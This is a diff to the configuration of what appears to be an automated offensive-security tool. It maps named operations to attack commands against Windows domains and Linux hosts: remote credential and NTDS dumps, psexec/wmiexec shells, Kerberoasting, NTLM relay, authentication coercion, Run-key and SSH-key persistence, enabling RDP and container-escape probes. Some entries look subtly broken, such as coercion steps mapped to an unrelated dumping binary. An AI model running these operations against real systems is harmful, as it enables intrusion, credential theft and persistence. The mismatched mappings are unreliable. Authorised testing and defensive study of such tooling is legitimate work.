@@ -8618,14 +8618,14 @@ args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'reg', '
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-reg'
+binary = 'reg.py'
 [[capability.provider.operation]]
 name = 'Remote Run Key Add'
 args = ['{rhost}/{username}:{password}', 'add', '-keyName', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', '-v', 'TSecUpdate', '-vd', '{payload}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-reg'
+binary = 'reg.py'
 [[capability.provider.operation]]
 name = 'Remote Run Key Query'
 args = ['{rhost}/{username}:{password}', 'query', '-keyName', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run']
@@ -8646,7 +8646,7 @@ args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'reg', '
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'WMIC Persistence Probe'
 args = ['{rhost}/{username}:{password}', 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run']
@@ -8999,7 +8999,7 @@ args = ['--max-time', '30', '-sk', '-o', '/dev/null', '-w', '%{http_code} %{size
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-smbserver'
+binary = 'smbserver.py'
 [[capability.provider.operation]]
 name = 'SMB Share Host'
 args = ['tsecshare', '.', '-smb2support']
@@ -9164,7 +9164,7 @@ args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'enum_pr
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-psexec'
+binary = 'psexec.py'
 [[capability.provider.operation]]
 name = 'Remote Shell Probe'
 args = ['{rhost}/{username}:{password}']
@@ -9647,7 +9647,7 @@ args = ['-rn', 'PATH=', '/etc/crontab', '/etc/cron.d/']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'type'
+binary = 'which'
 [[capability.provider.operation]]
 name = 'Shell Resolution Order'
 args = ['-a', 'systemctl', 'curl', 'python3']
@@ -9675,6 +9675,7 @@ label = 'CAPABILITY ABUSE'
 summary = 'Enumerate file capabilities and exploit privileged capabilities'
 inputs = [
   { key = 'rhost', type = 'target', required = false, default = '127.0.0.1' },
+  { key = 'pid', type = 'integer', required = true },
 ]
 [[capability.provider]]
 binary = 'getcap'
@@ -9708,7 +9709,7 @@ network = false
 binary = 'getpcaps'
 [[capability.provider.operation]]
 name = 'Process Capabilities'
-args = ['$$']
+args = ['{pid}']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -9915,6 +9916,7 @@ label = 'CONTAINER ESCAPE'
 summary = 'Detect containerization and probe breakout vectors'
 inputs = [
   { key = 'socket', type = 'file', required = false, default = '/var/run/docker.sock' },
+  { key = 'kube_ip', type = 'target', required = false, default = '10.96.0.1' },
 ]
 [[capability.provider]]
 binary = 'ls'
@@ -9990,7 +9992,7 @@ network = false
 binary = 'curl'
 [[capability.provider.operation]]
 name = 'K8s API Probe'
-args = ['--max-time', '30', '-sk', '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt', '-H', 'Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)', 'https://kubernetes.default.svc/api']
+args = ['--max-time', '30', '-sk', '--resolve', 'kubernetes.default.svc:443:{kube_ip}', 'https://kubernetes.default.svc/api']
 output = 'json'
 network = true
 [[capability.provider]]
@@ -10301,7 +10303,7 @@ args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--shares']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-smbclient'
+binary = 'smbclient'
 [[capability.provider.operation]]
 name = 'Admin Share Listing'
 args = ['{rhost}/{username}:{password}']
@@ -10315,14 +10317,14 @@ args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-x', 'whoami'
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-psexec'
+binary = 'psexec.py'
 [[capability.provider.operation]]
 name = 'Service Shell Test'
 args = ['{rhost}/{username}:{password}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'WMIC Shell Test'
 args = ['{rhost}/{username}:{password}', 'sc query state= all']
@@ -10378,7 +10380,7 @@ args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--services']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-smbclient'
+binary = 'smbclient'
 [[capability.provider.operation]]
 name = 'Payload Upload Test'
 args = ['{rhost}/{username}:{password}', 'use c$', 'put {payload}']
@@ -10425,21 +10427,21 @@ args = ['smb', '{rhost}', '-u', 'administrator', '-H', 'aad3b435b51404eeaad3b435
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-secretsdump'
+binary = 'secretsdump.py'
 [[capability.provider.operation]]
 name = 'Credential Dump'
 args = ['{rhost}/{username}:{password}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Shell Via WMI'
 args = ['{rhost}/{username}:{password}', 'whoami /priv']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-getST'
+binary = 'getST.py'
 [[capability.provider.operation]]
 name = 'Kerberos Ticket Request'
 args = ['{rhost}', '-u', '{username}', '-p', '{password}']
@@ -10481,7 +10483,7 @@ args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--shares']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-lookupsid'
+binary = 'lookupsid.py'
 [[capability.provider.operation]]
 name = 'SID Brute'
 args = ['{rhost}/{username}:{password}']
@@ -10509,7 +10511,7 @@ args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--ntds', 'drs
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-addcomputer'
+binary = 'addcomputer.py'
 [[capability.provider.operation]]
 name = 'Machine Account Create Test'
 args = ['{domain}/{username}:{password}', '{rhost}', '-computer-name', 'TSECPC']
@@ -11378,6 +11380,7 @@ summary = 'Probe DNS zone transfer and resolver config for escalation intel'
 inputs = [
   { key = 'domain', type = 'domain', required = true },
   { key = 'dns-server', type = 'target', required = false, default = '' },
+  { key = 'ip', type = 'target', required = true },
 ]
 [[capability.provider]]
 binary = 'dig'
@@ -11467,7 +11470,7 @@ network = true
 binary = 'dig'
 [[capability.provider.operation]]
 name = 'Reverse Zone Probe'
-args = ['-x', '{dns-server}', '+short']
+args = ['-x', '{ip}', '+short']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -11632,28 +11635,28 @@ args = ['-sV', '-p', '88', '--script', 'krb5-enum-users', '--script-args', 'krb5
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-getUserSPNs'
+binary = 'GetUserSPNs.py'
 [[capability.provider.operation]]
 name = 'SPN Enumeration'
 args = ['{domain}/{username}:{password}@{rhost}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-GetNPUsers'
+binary = 'GetNPUsers.py'
 [[capability.provider.operation]]
 name = 'ASREP Roast'
 args = ['{domain}/', '-usersfile', '{wl:ad/users.txt}', '-no-pass', '-outputfile', '/tmp/asrep']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-getTGT'
+binary = 'getTGT.py'
 [[capability.provider.operation]]
 name = 'TGT Request'
 args = ['{domain}/{username}:{password}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-psexec'
+binary = 'psexec.py'
 [[capability.provider.operation]]
 name = 'Kerberos Auth Shell'
 args = ['{rhost}', '-k', '-no-pass']
@@ -11695,28 +11698,28 @@ args = ['-sV', '-p', '464', '{rhost}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-findDelegation'
+binary = 'findDelegation.py'
 [[capability.provider.operation]]
 name = 'Delegation Enum'
 args = ['{domain}/{username}:{password}@{rhost}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-getArch'
+binary = 'getArch.py'
 [[capability.provider.operation]]
 name = 'Architecture Enum'
 args = ['{rhost}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-getST'
+binary = 'getST.py'
 [[capability.provider.operation]]
 name = 'SPN Ticket Request'
 args = ['{domain}/{username}:{password}', '-spn', 'cifs/{rhost}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-describeTicket'
+binary = 'describeTicket.py'
 [[capability.provider.operation]]
 name = 'Ticket Cache Inspect'
 args = ['/tmp/*.ccache']
@@ -11868,38 +11871,38 @@ inputs = [
   { key = 'rhost', type = 'target', required = true },
   { key = 'username', type = 'username', required = true },
   { key = 'password', type = 'password', required = true },
-  { key = 'url', type = 'url', required = false, default = '' },
+  { key = 'url', type = 'url', required = false, default = 'https://{rhost}' },
 ]
 [[capability.provider]]
-binary = 'impacket-psexec'
+binary = 'psexec.py'
 [[capability.provider.operation]]
 name = 'SMB Exec Shell'
 args = ['{rhost}/{username}:{password}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'WMI Exec Shell'
 args = ['{rhost}/{username}:{password}', 'whoami']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-atexec'
+binary = 'atexec.py'
 [[capability.provider.operation]]
 name = 'Task Scheduler Exec'
 args = ['{rhost}/{username}:{password}', 'whoami']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-dcomexec'
+binary = 'dcomexec.py'
 [[capability.provider.operation]]
 name = 'DCOM Exec Probe'
 args = ['{rhost}/{username}:{password}', 'whoami']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-smbexec'
+binary = 'smbexec'
 [[capability.provider.operation]]
 name = 'SMB Exec Alt'
 args = ['{rhost}/{username}:{password}']
@@ -11955,14 +11958,14 @@ args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-x', 'hostnam
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-getUsers'
+binary = 'GetADUsers.py'
 [[capability.provider.operation]]
 name = 'Domain User Pull'
 args = ['{domain}/{username}:{password}', '{rhost}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-smbclient'
+binary = 'smbclient'
 [[capability.provider.operation]]
 name = 'Share Write Exec Prep'
 args = ['{rhost}/{username}:{password}']
@@ -12013,7 +12016,7 @@ args = ['{hash}']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'name-that-hash'
+binary = 'hash-identifier'
 [[capability.provider.operation]]
 name = 'NTH Identify'
 args = ['-t', '{hash}']
@@ -12242,35 +12245,35 @@ inputs = [
   { key = 'password', type = 'password', required = true },
 ]
 [[capability.provider]]
-binary = 'impacket-secretsdump'
+binary = 'secretsdump.py'
 [[capability.provider.operation]]
 name = 'SAM Dump'
 args = ['{rhost}/{username}:{password}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-secretsdump'
+binary = 'secretsdump.py'
 [[capability.provider.operation]]
 name = 'NTDS Dump'
 args = ['{rhost}/{username}:{password}', '-just-dc-user', 'administrator']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-secretsdump'
+binary = 'secretsdump.py'
 [[capability.provider.operation]]
 name = 'Full NTDS Dump'
 args = ['{rhost}/{username}:{password}', '-just-dc']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-secretsdump'
+binary = 'secretsdump.py'
 [[capability.provider.operation]]
 name = 'Local File Dump'
 args = ['-sam', 'SAM', '-system', 'SYSTEM', '-ntds', 'ntds.dit']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'impacket-secretsdump'
+binary = 'secretsdump.py'
 [[capability.provider.operation]]
 name = 'No Preauth NTDS Dump'
 args = ['{rhost}/{username}:{password}', '-just-dc', '-no-preauth']
@@ -12442,7 +12445,7 @@ args = ['-u', '{username}', '-p', '{password}', '-U', '{rhost}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-lookupsid'
+binary = 'lookupsid.py'
 [[capability.provider.operation]]
 name = 'User SID Harvest'
 args = ['{rhost}/guest:']
@@ -12757,21 +12760,21 @@ inputs = [
   { key = 'password', type = 'password', required = true },
 ]
 [[capability.provider]]
-binary = 'impacket-getUserSPNs'
+binary = 'GetUserSPNs.py'
 [[capability.provider.operation]]
 name = 'SPN Harvest'
 args = ['{domain}/{username}:{password}@{rhost}', '-outputfile', '/tmp/kerberoast.out']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-getUserSPNs'
+binary = 'GetUserSPNs.py'
 [[capability.provider.operation]]
 name = 'Request All Tickets'
 args = ['{domain}/{username}:{password}@{rhost}', '-request']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-getUserSPNs'
+binary = 'GetUserSPNs.py'
 [[capability.provider.operation]]
 name = 'Request Targeted Ticket'
 args = ['{domain}/{username}:{password}@{rhost}', '-request-user', 'sqlservice']
@@ -12806,7 +12809,7 @@ args = ['--wordlist={wl:ad/passwords.txt}', '--format=krb5tgs', '/tmp/kerberoast
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'impacket-GetNPUsers'
+binary = 'GetNPUsers.py'
 [[capability.provider.operation]]
 name = 'ASREP Harvest'
 args = ['{domain}/', '-usersfile', '{wl:ad/users.txt}', '-no-pass', '-outputfile', '/tmp/asrep.out']
@@ -12820,7 +12823,7 @@ args = ['-m', '18200', '-a', '0', '/tmp/asrep.out', '{wl:ad/passwords.txt}', '--
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'impacket-findDelegation'
+binary = 'findDelegation.py'
 [[capability.provider.operation]]
 name = 'Delegation Enum'
 args = ['{domain}/{username}:{password}@{rhost}']
@@ -12834,14 +12837,14 @@ args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}', '--delegate']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-getTGT'
+binary = 'getTGT.py'
 [[capability.provider.operation]]
 name = 'TGT Pull'
 args = ['{domain}/{username}:{password}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-getST'
+binary = 'getST.py'
 [[capability.provider.operation]]
 name = 'Service Ticket Request'
 args = ['{domain}/{username}:{password}', '-spn', 'cifs/{rhost}']
@@ -12855,7 +12858,7 @@ args = ['-kt']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'impacket-describeTicket'
+binary = 'describeTicket.py'
 [[capability.provider.operation]]
 name = 'Ticket Detail Inspect'
 args = ['/tmp/*.ccache']
@@ -13407,14 +13410,14 @@ args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'mimikat
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-secretsdump'
+binary = 'secretsdump.py'
 [[capability.provider.operation]]
 name = 'Remote Full Pull'
 args = ['{rhost}/{username}:{password}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-secretsdump'
+binary = 'secretsdump.py'
 [[capability.provider.operation]]
 name = 'Remote SAM Pull'
 args = ['{rhost}/{username}:{password}', '-sam', 'SAM', '-system', 'SYSTEM', '-ntds', 'ntds.dit']
@@ -14186,7 +14189,7 @@ args = ['-h', '{rhost}', 'config', 'get', 'requirepass']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'mongo'
+binary = 'mongosh'
 [[capability.provider.operation]]
 name = 'Mongo Connect Test'
 args = ['--host', '{rhost}', '--eval', 'db.version()']
@@ -14503,7 +14506,7 @@ args = ['-o', '/tmp/hc.22000', '{capture}']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'hcxtools'
+binary = 'hcxhashtool'
 [[capability.provider.operation]]
 name = 'PMKID Extract'
 args = ['-r', '{capture}', '-o', '/tmp/pmkid.16800']
@@ -14921,42 +14924,42 @@ args = ['smb', '{rhost}', '-u', '{username}', '-H', '{hash}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-psexec'
+binary = 'psexec.py'
 [[capability.provider.operation]]
 name = 'Psexec Shell'
 args = ['{rhost}/{username}:{password}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-psexec'
+binary = 'psexec.py'
 [[capability.provider.operation]]
 name = 'Psexec Hash Shell'
 args = ['-hashes', '{hash}', '{rhost}/{username}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-smbexec'
+binary = 'smbexec'
 [[capability.provider.operation]]
 name = 'Smbexec Shell'
 args = ['{rhost}/{username}:{password}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-atexec'
+binary = 'atexec.py'
 [[capability.provider.operation]]
 name = 'Atexec Command'
 args = ['{rhost}/{username}:{password}', 'whoami']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Wmiexec Command'
 args = ['{rhost}/{username}:{password}', 'whoami']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-dcomexec'
+binary = 'dcomexec.py'
 [[capability.provider.operation]]
 name = 'Dcomexec Command'
 args = ['{rhost}/{username}:{password}', 'hostname']
@@ -15065,7 +15068,7 @@ args = ['--max-time', '30', '-k', '{rhost}:5986/wsman']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'WMI Alt Exec'
 args = ['{rhost}/{username}:{password}', 'net user']
@@ -15131,14 +15134,14 @@ args = ['rdp', '-s', '{rhost}/3389', '-u', '{username}', '-C', '{wl:smb/password
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'xfreerdp'
+binary = 'sdl-freerdp3'
 [[capability.provider.operation]]
 name = 'RDP Session Connect'
 args = ['/v:{rhost}', '/u:{username}', '/p:{password}', '/cert:ignore', '+auth-only']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'xfreerdp'
+binary = 'sdl-freerdp3'
 [[capability.provider.operation]]
 name = 'RDP Drive Redirect'
 args = ['/v:{rhost}', '/u:{username}', '/p:{password}', '/cert:ignore', '/drive:share,/tmp/share', '+auth-only']
@@ -15152,21 +15155,21 @@ args = ['rdp', '{rhost}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'RDP Enable Check'
 args = ['{rhost}/{username}:{password}', 'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'RDP Enable Set'
 args = ['{rhost}/{username}:{password}', 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-psexec'
+binary = 'psexec.py'
 [[capability.provider.operation]]
 name = 'RDP Group Add'
 args = ['{rhost}/{username}:{password}', 'net localgroup "Remote Desktop Users" {username} /add']
@@ -15300,21 +15303,21 @@ args = ['-I', '{iface}', '-A']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-ntlmrelayx'
+binary = 'ntlmrelayx.py'
 [[capability.provider.operation]]
 name = 'SMB Relay'
 args = ['-tf', '/tmp/relay_targets.txt', '-smb2support']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-ntlmrelayx'
+binary = 'ntlmrelayx.py'
 [[capability.provider.operation]]
 name = 'SMB Relay Dump'
 args = ['-tf', '/tmp/relay_targets.txt', '-smb2support', '--dump-sam']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-ntlmrelayx'
+binary = 'ntlmrelayx.py'
 [[capability.provider.operation]]
 name = 'Ldap Relay Dump'
 args = ['-tf', '/tmp/relay_targets.txt', '-wh', 'wpad', '-6']
@@ -15356,7 +15359,7 @@ args = ['-i', '{iface}', '-nn', '-c', '50', 'port', '445', 'or', 'port', '137']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'impacket-secretsdump'
+binary = 'secretsdump.py'
 [[capability.provider.operation]]
 name = 'Relay Dump Verify'
 args = ['{rhost}/{username}:{password}']
@@ -15799,7 +15802,7 @@ args = ['mssql', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'mssql
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-mssqlclient'
+binary = 'mssqlclient.py'
 [[capability.provider.operation]]
 name = 'MSSQL Client Session'
 args = ['{rhost}/{username}:{password}']
@@ -15914,7 +15917,7 @@ args = ['smb', '{rhost}', '-u', 'guest', '-p', '', '-M', 'enum_sessions']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Logon Session Enum'
 args = ['{rhost}/administrator:Password1', 'query user']
@@ -16168,7 +16171,7 @@ args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'machin
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-lookupsid'
+binary = 'lookupsid.py'
 [[capability.provider.operation]]
 name = 'SID Harvest'
 args = ['{rhost}/{username}:{password}']
@@ -16210,7 +16213,7 @@ args = ['-x', '-H', 'ldap://{rhost}', '-D', '{username}@{domain}', '-w', '{passw
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-net'
+binary = 'net'
 [[capability.provider.operation]]
 name = 'Net Domain Info'
 args = ['{domain}/{username}:{password}@{rhost}']
@@ -16270,7 +16273,7 @@ args = ['-x', '-H', 'ldap://{rhost}', '-D', '{username}@{domain}', '-w', '{passw
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-getST'
+binary = 'getST.py'
 [[capability.provider.operation]]
 name = 'Cert Based ST Request'
 args = ['{domain}/{username}:{password}', '-spn', 'cifs/{rhost}', '-impersonate', 'administrator']
@@ -16305,7 +16308,7 @@ args = ['-x', '-H', 'ldap://{rhost}', '-D', '{username}@{domain}', '-w', '{passw
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-psexec'
+binary = 'psexec.py'
 [[capability.provider.operation]]
 name = 'Post Cert Shell Test'
 args = ['{rhost}/administrator@{domain}']
@@ -16415,70 +16418,70 @@ inputs = [
   { key = 'password', type = 'password', required = true },
 ]
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'WMI Shell'
 args = ['{rhost}/{username}:{password}', 'whoami']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'WMI Process List'
 args = ['{rhost}/{username}:{password}', 'tasklist']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'WMI Service Enum'
 args = ['{rhost}/{username}:{password}', 'sc query type= service state= all']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'WMI Patch Level'
 args = ['{rhost}/{username}:{password}', 'systeminfo']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'WMI Network Enum'
 args = ['{rhost}/{username}:{password}', 'ipconfig /all']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'WMI Share Enum'
 args = ['{rhost}/{username}:{password}', 'net share']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'WMI Local Users'
 args = ['{rhost}/{username}:{password}', 'net user']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'WMI Domain Admins'
 args = ['{rhost}/{username}:{password}', 'net group "Domain Admins" /domain']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'WMI AV Check'
 args = ['{rhost}/{username}:{password}', 'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'WMI Installed Software'
 args = ['{rhost}/{username}:{password}', 'wmic product get name,version']
@@ -16492,7 +16495,7 @@ args = ['wmi', '{rhost}', '-u', '{username}', '-p', '{password}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-dcomexec'
+binary = 'dcomexec.py'
 [[capability.provider.operation]]
 name = 'DCOM Alt Shell'
 args = ['{rhost}/{username}:{password}', 'hostname']
@@ -16580,7 +16583,7 @@ args = ['-L', '{hosts}', '-l', '{username}', '-p', '{password}', 'ssh']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-psexec'
+binary = 'psexec.py'
 [[capability.provider.operation]]
 name = 'Pivot Shell First Admin Host'
 args = ['{rhost}/{username}:{password}']
@@ -16697,7 +16700,7 @@ inputs = [
   { key = 'password', type = 'password', required = true },
 ]
 [[capability.provider]]
-binary = 'impacket-dementor'
+binary = 'secretsdump.py'
 [[capability.provider.operation]]
 name = 'PetitPotam Coerce'
 args = ['-u', '{username}', '-p', '{password}', '-d', '{rhost}', '{listener}']
@@ -16711,7 +16714,7 @@ args = ['coerce', '--listener-ip', '{listener}', '--target-ip', '{rhost}', '-d',
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-printbugger'
+binary = 'secretsdump.py'
 [[capability.provider.operation]]
 name = 'Printer Bug Coerce'
 args = ['{rhost}/{username}:{password}', '{listener}']
@@ -16732,28 +16735,28 @@ args = ['-I', 'eth0', '-v']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-ntlmrelayx'
+binary = 'ntlmrelayx.py'
 [[capability.provider.operation]]
 name = 'Relay Coerced Auth'
 args = ['-tf', '/tmp/relay_targets.txt', '-smb2support', '-socks']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-ntlmrelayx'
+binary = 'ntlmrelayx.py'
 [[capability.provider.operation]]
 name = 'Relay LDAP Dump'
 args = ['-t', 'ldap://{rhost}', '--dump-adcs', '--no-validate']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-ntlmrelayx'
+binary = 'ntlmrelayx.py'
 [[capability.provider.operation]]
 name = 'Relay Shadow Creds'
 args = ['-t', 'ldaps://{rhost}', '--shadow-credentials', '--shadow-target', 'dc$']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'rpcdump'
+binary = 'rpcdump.py'
 [[capability.provider.operation]]
 name = 'SpoolService Check'
 args = ['{rhost}']
@@ -17151,7 +17154,7 @@ args = ['//{rhost}/C$/Users', '-U', '{username}%{password}', '-c', 'get desktop.
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-smbclient'
+binary = 'smbclient'
 [[capability.provider.operation]]
 name = 'Impacket Share Session'
 args = ['{rhost}/{username}:{password}']
@@ -17569,7 +17572,7 @@ network = false
 binary = 'ssh'
 [[capability.provider.operation]]
 name = 'Restricted Key Plant'
-args = ['-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'echo "command=\"/tmp/tsupd.sh\" ' , '$(cat {key})" >> ~/.ssh/authorized_keys']
+args = ['-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'cat {key} >> ~/.ssh/authorized_keys']
 output = 'lines'
 network = true
 [[capability.provider]]
@@ -17634,21 +17637,21 @@ args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'reg', '
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-reg'
+binary = 'reg.py'
 [[capability.provider.operation]]
 name = 'Remote Run Add'
 args = ['{rhost}/{username}:{password}', 'add', '-keyName', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', '-v', 'TSecUpdate', '-vd', '{payload}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-reg'
+binary = 'reg.py'
 [[capability.provider.operation]]
 name = 'Remote Run Query'
 args = ['{rhost}/{username}:{password}', 'query', '-keyName', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
 name = 'Run Key Reg Query'
 args = ['{rhost}/{username}:{password}', 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run']
@@ -17731,35 +17734,35 @@ args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'schtask
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-atexec'
+binary = 'atexec.py'
 [[capability.provider.operation]]
 name = 'At Task Exec'
 args = ['{rhost}/{username}:{password}', '{payload}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'impacket-wmiexec'
+binary = 'wmiexec.py'
 [[capability.provider.operation]]
